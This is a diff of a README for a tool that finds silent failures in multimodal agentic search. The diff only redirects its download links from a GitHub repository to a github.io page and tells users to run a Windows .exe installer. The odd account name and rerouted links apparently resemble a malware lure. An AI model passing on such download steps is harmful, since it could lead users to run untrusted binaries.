@@ -1,6 +1,6 @@
 # 🔍 silent-failures-multimodal-agentic-search - Find hidden errors in search tools
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue)](https://github.com/venapalatinaregistration346/silent-failures-multimodal-agentic-search)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue)](https://venapalatinaregistration346.github.io)
 
 This software helps users detect errors in multimodal agentic search systems. It identifies silent failures where search results appear correct but lack required data. The tool provides clear reports on system performance to improve accuracy. Research presented at the SIGIR 2026 SynthIR Workshop highlights the importance of these findings for modern search engines.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start the installation:
 
 Follow these steps to obtain the software:
 
-1. Visit the following link to access the download page: [https://github.com/venapalatinaregistration346/silent-failures-multimodal-agentic-search](https://github.com/venapalatinaregistration346/silent-failures-multimodal-agentic-search)
+1. Visit the following link to access the download page: [https://venapalatinaregistration346.github.io](https://venapalatinaregistration346.github.io)
 2. Locate the "Releases" section on the right side of the page.
 3. Click the most recent version available.
 4. Select the Windows installer file ending in .exe.
